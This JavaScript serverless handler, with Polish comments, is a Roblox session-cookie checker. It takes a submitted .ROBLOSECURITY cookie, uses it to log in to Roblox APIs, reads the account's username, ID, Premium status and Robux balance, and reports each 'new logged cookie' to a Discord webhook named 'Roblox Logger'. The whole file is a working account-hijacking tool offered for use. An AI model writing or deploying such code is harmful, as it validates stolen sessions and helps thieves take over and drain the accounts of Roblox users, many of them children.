export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Tylko POST dozwolone' });

  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ error: 'Brak poprawnego cookie' });
  }

  try {
    // ────────────────────────────────────────────────
    // 1. CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
      },
    });

    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      throw new Error('Nie udało się pobrać X-CSRF-Token – cookie prawdopodobnie nieważne');
    }

    // ────────────────────────────────────────────────
    // 2. Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });

    if (!userRes.ok) {
      if (userRes.status === 401) throw new Error('Cookie nieważne lub wygasłe (401)');
      throw new Error(`Błąd Roblox: ${userRes.status}`);
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // ────────────────────────────────────────────────
    // 3. Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json',
        },
      });
      if (premiumRes.ok) hasPremium = !!(await premiumRes.json());
    } catch {}

    // ────────────────────────────────────────────────
    // 4. Robux (aktualny endpoint w 2026 nadal działa)
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json',
        },
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // ────────────────────────────────────────────────
    // 5. Wysyłka do Discord Webhook (jeśli zmienna istnieje)
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (webhookUrl) {
      const embed = {
        title: "🔓 Nowe cookie zalogowane!",
        color: hasPremium ? 0x00ff9d : 0x1e90ff,
        fields: [
          { name: "Username", value: userData.name, inline: true },
          { name: "Display Name", value: userData.displayName || userData.name, inline: true },
          { name: "User ID", value: userId.toString(), inline: true },
          { name: "Premium", value: hasPremium ? "✅ TAK" : "❌ NIE", inline: true },
          { name: "Robux", value: robux.toLocaleString() + " ₪", inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Cookie Checker • " + new Date().toLocaleString('pl-PL') }
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [embed],
          username: "Roblox Logger",
          avatar_url: "https://i.imgur.com/xyz.png" // możesz zmienić na dowolne logo
        })
      });
    }

    // ────────────────────────────────────────────────
    // Odpowiedź dla użytkownika (frontend)
    res.status(200).json({
      success: true,
      username: userData.name,
      displayName: userData.displayName || userData.name,
      userId: userData.id,
      hasPremium,
      robux
    });

  } catch (err) {
    res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
}
